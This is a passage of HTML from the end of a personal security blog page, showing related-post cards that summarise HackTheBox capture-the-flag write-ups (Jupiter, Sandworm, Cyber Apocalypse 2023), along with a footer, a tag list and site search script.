--><em class="timeagosmall"
    date="2023-10-22 00:00:00 +0100">Oct 22, 2023</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Jupiter - HackTheBox</h3>
            <div class="text-muted small">
              <p>Jupiter is a very nice medium linux box on HackTheBox. It starts with exploiting an instance of Grafana that’s making an API call containing full SQL queries, which are executed without validation....
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/sandworm.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2023-10-22 00:00:00 +0100">Oct 22, 2023</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Sandworm - HackTheBox</h3>
            <div class="text-muted small">
              <p>Sandworm is a nice medium linux box on HackTheBox. It starts with exploiting an SSTI vulnerability in a custom web app that does some PGP operations using user input. Once inside, you’ll need to br...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/cyberapoc_23.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2023-03-23 00:00:00 +0100">Mar 23, 2023</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse 2023 - HackTheBox</h3>
            <div class="text-muted small">
              <p>Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges tha...
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/topology.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>Topology - HackTheBox</p>
  </a><a href="/posts/binary%20exploitation/format_strings_intro.html" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Introduction to Format Strings Vulnerabilities</p>
  </a></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2024
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/easy/">easy</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
